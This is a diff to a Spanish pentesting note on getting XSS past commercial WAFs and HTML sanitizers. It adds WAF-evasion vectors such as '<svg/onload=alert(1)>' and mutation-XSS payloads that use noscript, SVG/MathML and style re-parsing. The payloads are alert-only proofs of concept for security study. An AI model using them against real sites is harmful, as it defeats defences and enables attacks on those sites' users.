@@ -1,7 +1,6 @@
 ---
 tags:
   - Web/Red-Team
-  - Pentesting
   - Pentesting/Explotacion
   - XSS
 Fecha de actualización: 2026-06-08
@@ -27,11 +26,32 @@ Un WAF comercial (Cloudflare, Akamai, Imperva) no es una blacklist ingenua: usa 
 
 <mark style="background: #FF5582A6;">La metodología es de caja negra: probar carácter a carácter qué bloquea el WAF</mark>, identificar la firma y construir un payload equivalente que no la dispare pero siga siendo válido para el navegador. No hay payload mágico; hay un proceso de diferenciación.
 
+> [!example]+ Vectores poco firmados (punto de partida)
+> Las firmas suelen estar escritas para `onerror`/`onload` con espacios; estos vectores las esquivan y sirven de base para diferenciar:
+> ```html
+> <svg/onload=alert(1)>
+> <details ontoggle=alert(1) open>
+> <input autofocus onfocus=alert(1)>
+> <body onbeforetoggle=alert(1) style="display:block">
+> ```
+> El separador `/` en lugar de espacio (`<svg/onload>`) y los eventos modernos (`onbeforetoggle`, Chrome 114+; `onpointerrawupdate`) rompen muchas firmas heredadas. Desde aquí, diferencia carácter a carácter.
+
 # Mutation XSS (mXSS): romper sanitizadores
 
 Cuando la app sanea el HTML antes de insertarlo (en vez de bloquear por blacklist), el ataque cambia de naturaleza. <mark style="background: #8000E1A6;">El `mutation XSS` explota que el HTML se parsea **dos veces**: una al sanearlo y otra cuando el DOM lo recibe</mark>, y que el navegador "arregla" HTML malformado mutándolo. Si consigues que el HTML inocuo que aprueba el sanitizador se **mute** en HTML ejecutable al insertarse en el DOM, has saltado el sanitizado.
 
 El payload se esconde típicamente en valores de atributo o en contextos que el navegador reinterpreta al re-parsear (`</style>`, `</title>`, anidamientos), creando un contexto distinto entre los dos parseos. Es la clase de bug más relevante contra sanitizadores modernos.
+
+> [!example]+ Payloads mXSS de referencia
+> HTML que el sanitizador aprueba pero el navegador **muta** a ejecutable al re-parsearlo. Son ilustrativos —el vector real depende de la versión exacta del sanitizador—:
+> ```html
+> <!-- re-parseo de noscript -->
+> <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+> <!-- foreign content SVG/MathML: el cambio de namespace altera el parseo -->
+> <svg></p><style><a id="</style><img src=x onerror=alert(1)>">
+> <math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>
+> ```
+> La raíz es siempre la misma: crear un contexto (`</style>`, `</title>`, `<noscript>`, foreign content) que se interprete **distinto** en los dos parseos. La familia completa, en la investigación de cure53/PortSwigger citada abajo.
 
 # Bypasses de `DOMPurify`
 
